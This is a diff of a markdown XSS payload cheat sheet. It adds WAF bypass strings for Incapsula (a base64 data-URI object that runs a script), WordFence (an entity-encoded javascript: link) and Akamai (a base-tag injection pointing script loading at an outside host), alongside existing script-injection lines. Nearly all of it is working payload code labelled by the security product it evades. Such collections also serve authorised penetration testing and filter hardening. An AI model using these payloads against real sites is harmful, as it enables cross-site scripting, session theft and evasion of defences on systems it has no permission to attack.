@@ -754,10 +754,22 @@ anythinglr00</script><script>alert(document.domain)</script>uxldz
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 ```
 
-### Akamai WAF bypass by @zseano - 18th june
+### Incapsula WAF Bypass - 11th september
+
+```javascript
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+```
+
+### Akamai WAF Bypass by @zseano - 18th june
 
 ```javascript
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
+```
+
+### WordFence WAF Bypass by @brutelogic - 12th september
+
+```javascript
+<a href=javas&#99;ript:alert(1)>
 ```
 
 ## More fun
